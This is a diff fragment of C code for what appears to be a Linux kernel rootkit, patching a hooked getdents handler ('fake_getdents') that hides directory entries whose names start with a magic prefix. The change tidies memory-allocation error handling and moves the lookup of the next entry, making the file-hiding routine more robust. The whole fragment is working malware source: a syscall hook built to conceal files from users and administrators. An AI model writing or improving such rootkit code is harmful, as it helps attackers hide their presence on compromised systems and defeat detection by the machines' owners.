@@ -60,27 +60,29 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
   dirent = (struct linux_dirent *)buffer;
   
   while (i < bytes_read) {
-    j = 0;
     d_reclen = dirent->d_reclen;
-    
+
+    j = 0;
     while (j < MAGIC_PREFIX_LEN && dirent->d_name[j] != '\0' && dirent->d_name[j] == MAGIC_PREFIX[j])
       j++;
 
     if (j == MAGIC_PREFIX_LEN) {
       if (last_d_reclen == 0) {
-	next_dirent = (struct linux_dirent *)(buffer + i + d_reclen);
-	next_d_reclen = next_dirent->d_reclen;
 	buffer_dirent = kmalloc(d_reclen, GFP_KERNEL);
 	if (!buffer_dirent) {
 	  printk(KERN_INFO "failed to kmalloc buffer_dirent");
-	  continue;
+	  kfree(buffer);
+	  return bytes_read;
 	}
 
+	next_dirent = (struct linux_dirent *)(buffer + i + d_reclen);
+	next_d_reclen = next_dirent->d_reclen;
 	buffer_next_dirent = kmalloc(next_d_reclen, GFP_KERNEL);
 	if (!buffer_next_dirent) {
 	  printk(KERN_INFO "failed to kmalloc buffer_next_dirent");
 	  kfree(buffer_dirent);
-	  continue;
+	  kfree(buffer);
+	  return bytes_read;
 	}
 	
 	memcpy(buffer_dirent, dirent, d_reclen);
